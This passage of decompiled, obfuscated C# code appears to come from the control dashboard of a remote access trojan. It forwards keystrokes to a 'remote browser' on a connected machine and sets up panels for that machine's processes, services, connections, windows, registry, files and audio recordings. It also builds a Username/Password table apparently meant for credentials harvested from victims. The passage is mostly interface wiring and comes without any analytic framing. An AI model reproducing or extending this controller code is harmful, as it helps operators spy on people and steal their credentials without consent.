                case 0x33:
                case 0x34:
                case 0x35:
                case 0x36:
                case 0x37:
                case 0x38:
                case 0x39:
                    break;

                case 0x3a:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x3b:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 60:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x3d:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x3e:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x3f:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x40:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                default:
                    switch (num2)
                    {
                        case 0x5b:
                            class2 = new Class136.Class138();
                            class2.string_0 = this.string_4;
                            class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                            return;

                        case 0x5c:
                            class2 = new Class136.Class138();
                            class2.string_0 = this.string_4;
                            class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                            return;

                        case 0x5d:
                            class2 = new Class136.Class138();
                            class2.string_0 = this.string_4;
                            class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                            return;

                        case 0x5e:
                            class2 = new Class136.Class138();
                            class2.string_0 = this.string_4;
                            class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                            return;

                        case 0x5f:
                            class2 = new Class136.Class138();
                            class2.string_0 = this.string_4;
                            class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                            return;

                        case 0x60:
                            class2 = new Class136.Class138();
                            class2.string_0 = this.string_4;
                            class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                            return;

                        default:
                            switch (num2)
                            {
                                case 0x7b:
                                    class2 = new Class136.Class138();
                                    class2.string_0 = this.string_4;
                                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                                    class2.long_0 = 0L;
                                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                                    {
                                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                                    }
                                    return;

                                case 0x7c:
                                    class2 = new Class136.Class138();
                                    class2.string_0 = this.string_4;
                                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                                    class2.long_0 = 0L;
                                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                                    {
                                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                                    }
                                    return;

                                case 0x7d:
                                    class2 = new Class136.Class138();
                                    class2.string_0 = this.string_4;
                                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                                    class2.long_0 = 0L;
                                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                                    {
                                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                                    }
                                    return;

                                case 0x7e:
                                    class2 = new Class136.Class138();
                                    class2.string_0 = this.string_4;
                                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                                    class2.long_0 = 0L;
                                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                                    {
                                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                                    }
                                    return;

                                default:
                                    break;
                            }
                            break;
                    }
                    break;
            }
            if (this.vmethod_464().Bounds.Contains(base.PointToClient(Cursor.Position)) & (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0))
            {
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "remotebrowser_key|" + e.KeyChar.ToString();
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
    }

    private void fDashboard_Load(object sender, EventArgs e)
    {
        this.method_147();
        base.Width = 0x400;
        base.Height = 600;
        this.vmethod_18().Width = base.Width - 2;
        this.vmethod_18().Height = (base.Height - this.vmethod_18().Top) - 30;
        this.method_80();
        this.vmethod_156().BackColor = Color.FromArgb(0x1a, this.vmethod_156().BackColor);
        this.vmethod_162().Left = (int) Math.Round((double) ((((double) this.vmethod_156().Width) / 2.0) - (((double) this.vmethod_162().Width) / 2.0)));
        this.vmethod_204().BackColor = Color.FromArgb(0x1a, this.vmethod_204().BackColor);
        this.vmethod_204().Location = this.vmethod_156().Location;
        this.vmethod_472().set_Value(0);
        this.vmethod_472().Left = (int) Math.Round((double) ((this.vmethod_720().Left + (((double) this.vmethod_720().Width) / 2.0)) - (((double) this.vmethod_472().Width) / 2.0)));
        this.vmethod_472().Top = (int) Math.Round((double) ((this.vmethod_720().Top + (((double) this.vmethod_720().Height) / 2.0)) - (((double) this.vmethod_472().Height) / 2.0)));
        this.vmethod_474().Left = this.vmethod_472().Left;
        this.vmethod_474().Top = this.vmethod_472().Top;
        this.vmethod_472().set_ShowText(true);
        this.vmethod_752().set_Value(0);
        this.vmethod_752().Left = (int) Math.Round((double) ((this.vmethod_750().Left + (((double) this.vmethod_750().Width) / 2.0)) - (((double) this.vmethod_752().Width) / 2.0)));
        this.vmethod_752().Top = (int) Math.Round((double) ((this.vmethod_750().Top + (((double) this.vmethod_750().Height) / 2.0)) - (((double) this.vmethod_752().Height) / 2.0)));
        this.vmethod_754().Left = this.vmethod_752().Left;
        this.vmethod_754().Top = this.vmethod_752().Top;
        this.vmethod_752().set_ShowText(true);
        this.vmethod_120().set_Value(0);
        this.vmethod_120().Left = (int) Math.Round((double) ((this.vmethod_78().Left + (((double) this.vmethod_78().Width) / 2.0)) - (((double) this.vmethod_120().Width) / 2.0)));
        this.vmethod_120().Top = (int) Math.Round((double) ((this.vmethod_78().Top + (((double) this.vmethod_78().Height) / 2.0)) - (((double) this.vmethod_120().Height) / 2.0)));
        this.vmethod_508().Left = this.vmethod_120().Left;
        this.vmethod_508().Top = this.vmethod_120().Top;
        this.vmethod_120().set_ShowText(true);
        this.vmethod_576().Left = (int) Math.Round((double) ((this.vmethod_578().Left + (((double) this.vmethod_578().Width) / 2.0)) - (((double) this.vmethod_576().Width) / 2.0)));
        this.vmethod_576().Top = (int) Math.Round((double) ((this.vmethod_578().Top + (((double) this.vmethod_578().Height) / 2.0)) - (((double) this.vmethod_576().Height) / 2.0)));
        this.vmethod_566().Left = this.vmethod_576().Left;
        this.vmethod_566().Top = this.vmethod_576().Top;
        this.vmethod_576().set_ShowText(true);
        this.vmethod_622().Left = (int) Math.Round((double) ((this.vmethod_624().Left + (((double) this.vmethod_624().Width) / 2.0)) - (((double) this.vmethod_622().Width) / 2.0)));
        this.vmethod_622().Top = (int) Math.Round((double) ((this.vmethod_624().Top + (((double) this.vmethod_624().Height) / 2.0)) - (((double) this.vmethod_622().Height) / 2.0)));
        this.vmethod_614().Left = this.vmethod_622().Left;
        this.vmethod_614().Top = this.vmethod_622().Top;
        this.vmethod_622().set_ShowText(true);
        this.vmethod_364().set_Value(0);
        this.vmethod_364().Left = (int) Math.Round((double) ((this.vmethod_718().Left + (((double) this.vmethod_718().Width) / 2.0)) - (((double) this.vmethod_364().Width) / 2.0)));
        this.vmethod_364().Top = (int) Math.Round((double) ((this.vmethod_718().Top + (((double) this.vmethod_718().Height) / 2.0)) - (((double) this.vmethod_364().Height) / 2.0)));
        this.vmethod_364().set_ShowText(true);
        this.vmethod_512().Left = this.vmethod_364().Left;
        this.vmethod_512().Top = this.vmethod_364().Top;
        this.vmethod_548().set_Value(0);
        this.vmethod_548().Left = (int) Math.Round((double) ((this.vmethod_550().Left + (((double) this.vmethod_550().Width) / 2.0)) - (((double) this.vmethod_548().Width) / 2.0)));
        this.vmethod_548().Top = (int) Math.Round((double) ((this.vmethod_550().Top + (((double) this.vmethod_550().Height) / 2.0)) - (((double) this.vmethod_548().Height) / 2.0)));
        this.vmethod_548().set_ShowText(true);
        this.vmethod_546().Left = this.vmethod_548().Left;
        this.vmethod_546().Top = this.vmethod_548().Top;
        this.vmethod_290().Left = (int) Math.Round((double) ((this.vmethod_280().Left + (((double) this.vmethod_280().Width) / 2.0)) - (((double) this.vmethod_290().Width) / 2.0)));
        this.vmethod_290().Top = (int) Math.Round((double) ((this.vmethod_280().Top + (((double) this.vmethod_280().Height) / 2.0)) - (((double) this.vmethod_290().Height) / 2.0)));
        this.vmethod_556().Left = this.vmethod_290().Left;
        this.vmethod_556().Top = this.vmethod_290().Top;
        this.vmethod_552().Columns.Add("oVAL1", string.Empty);
        this.vmethod_552().Columns.Add("oVAL2", string.Empty);
        this.vmethod_552().Columns[0].Width = 300;
        this.vmethod_552().Columns[1].Width = (this.vmethod_552().Width - this.vmethod_552().Columns[0].Width) - 6;
        this.vmethod_554().Left = (int) Math.Round((double) ((this.vmethod_552().Left + (((double) this.vmethod_552().Width) / 2.0)) - (((double) this.vmethod_554().Width) / 2.0)));
        this.vmethod_554().Top = (int) Math.Round((double) ((this.vmethod_552().Top + (((double) this.vmethod_552().Height) / 2.0)) - (((double) this.vmethod_554().Height) / 2.0)));
        this.vmethod_550().Columns.Add("Application");
        this.vmethod_550().Columns.Add("Location");
        this.vmethod_550().Columns.Add("Publisher");
        this.vmethod_550().Columns.Add("Installed on");
        this.vmethod_550().Columns.Add("Size");
        this.vmethod_550().Columns.Add("Version");
        this.vmethod_550().Columns.Add("Silent uninstall");
        this.vmethod_550().Columns[0].Width = 220;
        this.vmethod_550().Columns[1].Width = 220;
        this.vmethod_550().Columns[2].Width = 160;
        this.vmethod_550().Columns[3].Width = 80;
        this.vmethod_550().Columns[4].Width = 80;
        this.vmethod_550().Columns[5].Width = 100;
        this.vmethod_550().Columns[6].Width = 80;
        this.vmethod_418().Columns.Add("Type");
        this.vmethod_418().Columns.Add("Software");
        this.vmethod_418().Columns.Add("Server");
        this.vmethod_418().Columns.Add("Username");
        this.vmethod_418().Columns.Add("Password");
        this.vmethod_418().Columns[0].Width = (int) Math.Round((double) ((((double) this.vmethod_418().Width) / 5.0) - 10.0));
        this.vmethod_418().Columns[1].Width = (int) Math.Round((double) ((((double) this.vmethod_418().Width) / 5.0) - 10.0));
        this.vmethod_418().Columns[2].Width = (int) Math.Round((double) ((((double) this.vmethod_418().Width) / 5.0) - 10.0));
        this.vmethod_418().Columns[3].Width = (int) Math.Round((double) ((((double) this.vmethod_418().Width) / 5.0) - 10.0));
        this.vmethod_418().Columns[4].Width = (int) Math.Round((double) ((((double) this.vmethod_418().Width) / 5.0) - 10.0));
        this.vmethod_78().Columns.Add("Name");
        this.vmethod_78().Columns.Add("Description");
        this.vmethod_78().Columns.Add("Path");
        this.vmethod_78().Columns.Add("PID");
        this.vmethod_78().Columns.Add("Threads");
        this.vmethod_78().Columns.Add("Memory");
        this.vmethod_78().Columns.Add("Priority");
        this.vmethod_78().Columns[0].Width = 140;
        this.vmethod_78().Columns[1].Width = 160;
        this.vmethod_78().Columns[2].Width = 340;
        this.vmethod_78().Columns[3].Width = 80;
        this.vmethod_78().Columns[4].Width = 80;
        this.vmethod_78().Columns[5].Width = 80;
        this.vmethod_78().Columns[6].Width = 80;
        this.vmethod_718().Columns.Add("Process");
        this.vmethod_718().Columns.Add("PID");
        this.vmethod_718().Columns.Add("Protocol");
        this.vmethod_718().Columns.Add("Local address");
        this.vmethod_718().Columns.Add("Local port");
        this.vmethod_718().Columns.Add("Remote address");
        this.vmethod_718().Columns.Add("Remote port");
        this.vmethod_718().Columns.Add("State");
        this.vmethod_718().Columns[0].Width = 180;
        this.vmethod_718().Columns[1].Width = 80;
        this.vmethod_718().Columns[2].Width = 100;
        this.vmethod_718().Columns[3].Width = 140;
        this.vmethod_718().Columns[4].Width = 80;
        this.vmethod_718().Columns[5].Width = 140;
        this.vmethod_718().Columns[6].Width = 80;
        this.vmethod_718().Columns[7].Width = 140;
        this.vmethod_578().Columns.Add("Name");
        this.vmethod_578().Columns.Add("Display name");
        this.vmethod_578().Columns.Add("PID");
        this.vmethod_578().Columns.Add("Status");
        this.vmethod_578().Columns.Add("Startup type");
        this.vmethod_578().Columns.Add("Type");
        this.vmethod_578().Columns.Add("Error control");
        this.vmethod_578().Columns.Add("Path");
        this.vmethod_578().Columns.Add("Dependencies");
        this.vmethod_578().Columns[0].Width = 120;
        this.vmethod_578().Columns[1].Width = 160;
        this.vmethod_578().Columns[2].Width = 50;
        this.vmethod_578().Columns[3].Width = 90;
        this.vmethod_578().Columns[4].Width = 90;
        this.vmethod_578().Columns[5].Width = 100;
        this.vmethod_578().Columns[6].Width = 100;
        this.vmethod_578().Columns[7].Width = 180;
        this.vmethod_578().Columns[8].Width = 80;
        this.vmethod_624().Columns.Add("Title");
        this.vmethod_624().Columns.Add("Class");
        this.vmethod_624().Columns.Add("Hwnd");
        this.vmethod_624().Columns.Add("Size");
        this.vmethod_624().Columns.Add("State");
        this.vmethod_624().Columns[0].Width = 360;
        this.vmethod_624().Columns[1].Width = 300;
        this.vmethod_624().Columns[2].Width = 100;
        this.vmethod_624().Columns[3].Width = 100;
        this.vmethod_624().Columns[4].Width = 100;
        this.vmethod_720().Columns.Add("Name");
        this.vmethod_720().Columns.Add("Description");
        this.vmethod_720().Columns.Add("Type");
        this.vmethod_720().Columns.Add("Size");
        this.vmethod_720().Columns.Add("Attributes");
        this.vmethod_720().Columns.Add("Last modified");
        this.vmethod_720().Columns[0].Width = 140;
        this.vmethod_720().Columns[1].Width = 160;
        this.vmethod_720().Columns[2].Width = 120;
        this.vmethod_720().Columns[3].Width = 80;
        this.vmethod_720().Columns[4].Width = 80;
        this.vmethod_720().Columns[5].Width = 140;
        this.vmethod_76().Columns.Add(string.Empty);
        this.vmethod_76().Columns[0].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
        this.vmethod_76().Columns[0].Width = (this.vmethod_76().Width - 6) - SystemInformation.VerticalScrollBarWidth;
        Class130.ShowScrollBar(this.vmethod_76().Handle, 1, true);
        this.vmethod_750().Columns.Add("Name");
        this.vmethod_750().Columns.Add("Type");
        this.vmethod_750().Columns.Add("Data");
        this.vmethod_750().Columns[0].Width = 180;
        this.vmethod_750().Columns[1].Width = 140;
        this.vmethod_750().Columns[2].Width = 400;
        this.vmethod_748().Columns.Add("Name");
        this.vmethod_748().Columns[0].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
        this.vmethod_748().Columns[0].Width = (this.vmethod_748().Width - 6) - SystemInformation.VerticalScrollBarWidth;
        Class130.ShowScrollBar(this.vmethod_748().Handle, 1, true);
        this.vmethod_388().Columns.Add("Date");
        this.vmethod_388().Columns.Add("Size");
        this.vmethod_388().Columns[0].Width = 80;
        this.vmethod_388().Columns[1].Width = ((this.vmethod_388().Width - this.vmethod_388().Columns[0].Width) - 6) - SystemInformation.VerticalScrollBarWidth;
        this.vmethod_316().Columns.Add("Name");
        this.vmethod_316().Columns.Add("Size");
        this.vmethod_316().Columns.Add("Duration");
        this.vmethod_316().Columns.Add("Sample rate");
        this.vmethod_316().Columns.Add("Channels");
        this.vmethod_316().Columns.Add("Bits per sample");
        this.vmethod_316().Columns.Add("Block align");
        this.vmethod_316().Columns.Add("Audio format");
        this.vmethod_316().Columns[0].Width = 160;
        this.vmethod_316().Columns[1].Width = 100;
        this.vmethod_316().Columns[2].Width = 120;
        this.vmethod_316().Columns[3].Width = 100;
        this.vmethod_316().Columns[4].Width = 100;
        this.vmethod_316().Columns[5].Width = 100;
        this.vmethod_316().Columns[6].Width = 100;
        this.vmethod_316().Columns[7].Width = 100;
        int num = 10;
        while (true)
        {
            this.vmethod_82().Items.Add(Conversions.ToString(num) + "%");
            num += 10;
            if (num > 100)
            {
                this.vmethod_82().SelectedItem = this.vmethod_82().Items[9];
                int item = 1;
                while (true)
                {
                    this.vmethod_320().Items.Add(item);
                    item++;
                    if (item > 10)
                    {
                        this.vmethod_320().SelectedItem = this.vmethod_320().Items[1];
                        this.vmethod_304().Items.Add(0x1f40);
                        this.vmethod_304().Items.Add(0x2b11);
                        this.vmethod_304().Items.Add(0x5622);
                        this.vmethod_304().Items.Add(0xac44);
                        this.vmethod_304().SelectedItem = this.vmethod_304().Items[0];
                        this.vmethod_466().ReadOnly = true;
                        this.vmethod_466().BackColor = Color.White;
                        this.gclass9_0 = new GClass9();
                        this.vmethod_388().ListViewItemSorter = this.gclass9_0;
                        this.vmethod_316().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_718().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_418().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_76().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_720().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_552().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_388().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_78().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_578().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_550().GridLines = Class135.smethod_0().Gridlines;
                        this.vmethod_624().GridLines = Class135.smethod_0().Gridlines;
                        return;
                    }
                }
            }
        }
    }

    private void fDashboard_Resize(object sender, EventArgs e)
    {
        this.vmethod_18().Width = base.Width - 2;
        this.vmethod_18().Height = (base.Height - this.vmethod_18().Top) - 30;
        this.vmethod_552().Columns[this.vmethod_552().Columns["oVAL2"].Index].Width = (this.vmethod_552().Width - this.vmethod_552().Columns[this.vmethod_552().Columns["oVAL1"].Index].Width) - 6;
        this.method_80();
        this.method_41();
        this.method_40();
    }

    [DllImport("user32.dll")]
    public static extern long FindWindowW([MarshalAs(UnmanagedType.LPTStr)] string string_12, [MarshalAs(UnmanagedType.LPTStr)] string string_13);
    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern long GetSystemMenu(long long_1, long long_2);
    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        RectangleParemeters paremeters = new RectangleParemeters();
        RectangleParemeters paremeters2 = new RectangleParemeters();
        RectangleParemeters paremeters3 = new RectangleParemeters();
        RectangleParemeters paremeters4 = new RectangleParemeters();
        RectangleParemeters paremeters5 = new RectangleParemeters();
        RectangleParemeters paremeters6 = new RectangleParemeters();
        RectangleParemeters paremeters7 = new RectangleParemeters();
        RectangleParemeters paremeters8 = new RectangleParemeters();
        ComponentResourceManager manager = new ComponentResourceManager(typeof(fDashboard));
        this.vmethod_1(new MenuStrip());
        this.vmethod_3(new ToolStripMenuItem());
        this.vmethod_15(new ToolStripMenuItem());
        this.vmethod_29(new ToolStripMenuItem());
        this.vmethod_355(new ToolStripMenuItem());
        this.vmethod_411(new ToolStripMenuItem());
        this.vmethod_457(new ToolStripMenuItem());
        this.vmethod_7(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_9(new ToolStripMenuItem());
        this.vmethod_11(new ToolStripSeparator());
        this.vmethod_13(new ToolStripMenuItem());
        this.vmethod_19(new TabControl());
        this.vmethod_21(new TabPage());
        this.vmethod_555(new ZeroitProgressIndicator());
        this.vmethod_23(new TabPage());
        this.vmethod_689(new VisualScrollBar());
        this.vmethod_687(new VisualButton());
        this.vmethod_87(new VisualButton());
        this.vmethod_27(new Label());
        this.vmethod_293(new CheckBox());
        this.vmethod_251(new ComboBox());
        this.vmethod_247(new CheckBox());
        this.vmethod_99(new RadioButton());
        this.vmethod_101(new RadioButton());
        this.vmethod_95(new CheckBox());
        this.vmethod_97(new CheckBox());
        this.vmethod_93(new Label());
        this.vmethod_81(new Label());
        this.vmethod_83(new ComboBox());
        this.vmethod_85(new Label());
        this.vmethod_89(new ComboBox());
        this.vmethod_91(new Label());
        this.vmethod_33(new TabPage());
        this.vmethod_509(new ZeroitProgressIndicator());
        this.vmethod_123(new StatusStrip());
        this.vmethod_125(new ToolStripStatusLabel());
        this.vmethod_127(new ToolStripStatusLabel());
        this.vmethod_129(new ToolStripStatusLabel());
        this.vmethod_131(new ToolStripStatusLabel());
        this.vmethod_133(new ToolStripStatusLabel());
        this.vmethod_671(new ToolStripStatusLabel());
        this.vmethod_135(new ToolStripProgressBar());
        this.vmethod_35(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_37(new ToolStripMenuItem());
        this.vmethod_39(new ToolStripSeparator());
        this.vmethod_41(new ToolStripMenuItem());
        this.vmethod_43(new ToolStripMenuItem());
        this.vmethod_45(new ToolStripSeparator());
        this.vmethod_51(new ToolStripMenuItem());
        this.vmethod_53(new ToolStripMenuItem());
        this.vmethod_55(new ToolStripMenuItem());
        this.vmethod_57(new ToolStripMenuItem());
        this.vmethod_59(new ToolStripMenuItem());
        this.vmethod_61(new ToolStripMenuItem());
        this.vmethod_63(new ToolStripMenuItem());
        this.vmethod_65(new ToolStripSeparator());
        this.vmethod_47(new ToolStripMenuItem());
        this.vmethod_67(new ToolStripSeparator());
        this.vmethod_49(new ToolStripMenuItem());
        this.vmethod_435(new ToolStripMenuItem());
        this.vmethod_437(new ToolStripSeparator());
        this.vmethod_439(new ToolStripMenuItem());
        this.vmethod_71(new TabPage());
        this.vmethod_697(new VisualButton());
        this.vmethod_475(new ZeroitProgressIndicator());
        this.vmethod_455(new ComboBox());
        this.vmethod_397(new StatusStrip());
        this.vmethod_399(new ToolStripStatusLabel());
        this.vmethod_401(new ToolStripStatusLabel());
        this.vmethod_403(new ToolStripStatusLabel());
        this.vmethod_405(new ToolStripStatusLabel());
        this.vmethod_407(new ToolStripStatusLabel());
        this.vmethod_445(new ToolStripStatusLabel());
        this.vmethod_409(new ToolStripProgressBar());
        this.vmethod_205(new Panel());
        this.vmethod_699(new VisualButton());
        this.vmethod_207(new Label());
        this.vmethod_209(new Label());
        this.vmethod_211(new Label());
        this.vmethod_213(new Label());
        this.vmethod_215(new ZeroitProgressBarNormal());
        this.vmethod_157(new Panel());
        this.vmethod_701(new VisualButton());
        this.vmethod_167(new Label());
        this.vmethod_165(new Label());
        this.vmethod_163(new Label());
        this.vmethod_159(new Label());
        this.vmethod_161(new ZeroitProgressBarNormal());
        this.vmethod_111(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_113(new ToolStripMenuItem());
        this.vmethod_299(new ToolStripMenuItem());
        this.vmethod_217(new ToolStripMenuItem());
        this.vmethod_219(new ToolStripMenuItem());
        this.vmethod_221(new ToolStripMenuItem());
        this.vmethod_223(new ToolStripMenuItem());
        this.vmethod_225(new ToolStripMenuItem());
        this.vmethod_227(new ToolStripMenuItem());
        this.vmethod_229(new ToolStripMenuItem());
        this.vmethod_231(new ToolStripMenuItem());
        this.vmethod_233(new ToolStripMenuItem());
        this.vmethod_235(new ToolStripMenuItem());
        this.vmethod_237(new ToolStripMenuItem());
        this.vmethod_239(new ToolStripMenuItem());
        this.vmethod_241(new ToolStripMenuItem());
        this.vmethod_243(new ToolStripMenuItem());
        this.vmethod_115(new ToolStripSeparator());
        this.vmethod_117(new ToolStripMenuItem());
        this.vmethod_297(new ToolStripMenuItem());
        this.vmethod_141(new ToolStripSeparator());
        this.vmethod_169(new ToolStripMenuItem());
        this.vmethod_171(new ToolStripMenuItem());
        this.vmethod_155(new ToolStripSeparator());
        this.vmethod_139(new ToolStripMenuItem());
        this.vmethod_103(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_105(new ToolStripMenuItem());
        this.vmethod_145(new ToolStripMenuItem());
        this.vmethod_183(new ToolStripMenuItem());
        this.vmethod_185(new ToolStripMenuItem());
        this.vmethod_187(new ToolStripMenuItem());
        this.vmethod_189(new ToolStripSeparator());
        this.vmethod_153(new ToolStripMenuItem());
        this.vmethod_245(new ToolStripSeparator());
        this.vmethod_147(new ToolStripMenuItem());
        this.vmethod_149(new ToolStripMenuItem());
        this.vmethod_151(new ToolStripMenuItem());
        this.vmethod_179(new ToolStripMenuItem());
        this.vmethod_181(new ToolStripMenuItem());
        this.vmethod_191(new ToolStripMenuItem());
        this.vmethod_193(new ToolStripMenuItem());
        this.vmethod_195(new ToolStripMenuItem());
        this.vmethod_197(new ToolStripMenuItem());
        this.vmethod_199(new ToolStripMenuItem());
        this.vmethod_201(new ToolStripMenuItem());
        this.vmethod_203(new ToolStripMenuItem());
        this.vmethod_107(new ToolStripSeparator());
        this.vmethod_109(new ToolStripMenuItem());
        this.vmethod_295(new ToolStripMenuItem());
        this.vmethod_143(new ToolStripSeparator());
        this.vmethod_173(new ToolStripMenuItem());
        this.vmethod_175(new ToolStripMenuItem());
        this.vmethod_177(new ToolStripSeparator());
        this.vmethod_381(new ToolStripMenuItem());
        this.vmethod_385(new ToolStripMenuItem());
        this.vmethod_441(new ToolStripSeparator());
        this.vmethod_383(new ToolStripMenuItem());
        this.vmethod_691(new ToolStripSeparator());
        this.vmethod_813(new ToolStripMenuItem());
        this.vmethod_137(new ToolStripMenuItem());
        this.vmethod_253(new TabPage());
        this.vmethod_717(new VisualScrollBar());
        this.vmethod_559(new Label());
        this.vmethod_269(new ComboBox());
        this.vmethod_255(new Label());
        this.vmethod_257(new Label());
        this.vmethod_259(new VisualButton());
        this.vmethod_261(new Label());
        this.vmethod_263(new VisualButton());
        this.vmethod_271(new TabPage());
        this.vmethod_817(new VisualButton());
        this.vmethod_713(new VisualButton());
        this.vmethod_705(new VisualButton());
        this.vmethod_703(new VisualButton());
        this.vmethod_557(new ZeroitProgressIndicator());
        this.vmethod_483(new StatusStrip());
        this.vmethod_485(new ToolStripStatusLabel());
        this.vmethod_487(new ToolStripStatusLabel());
        this.vmethod_489(new ToolStripStatusLabel());
        this.vmethod_491(new ToolStripStatusLabel());
        this.vmethod_493(new ToolStripProgressBar());
        this.vmethod_387(new Label());
        this.vmethod_391(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_393(new ToolStripMenuItem());
        this.vmethod_815(new ToolStripSeparator());
        this.vmethod_395(new ToolStripMenuItem());
        this.vmethod_281(new RichTextBox());
        this.vmethod_285(new TabPage());
        this.vmethod_707(new VisualButton());
        this.vmethod_477(new StatusStrip());
        this.vmethod_479(new ToolStripStatusLabel());
        this.vmethod_481(new ToolStripStatusLabel());
        this.vmethod_287(new RichTextBox());
        this.vmethod_301(new TabPage());
        this.vmethod_695(new VisualButton());
        this.vmethod_693(new VisualButton());
        this.vmethod_331(new CheckBox());
        this.vmethod_327(new ComboBox());
        this.vmethod_329(new Label());
        this.vmethod_319(new Label());
        this.vmethod_321(new ComboBox());
        this.vmethod_323(new Label());
        this.vmethod_303(new Label());
        this.vmethod_305(new ComboBox());
        this.vmethod_307(new Label());
        this.vmethod_309(new StatusStrip());
        this.vmethod_315(new ToolStripStatusLabel());
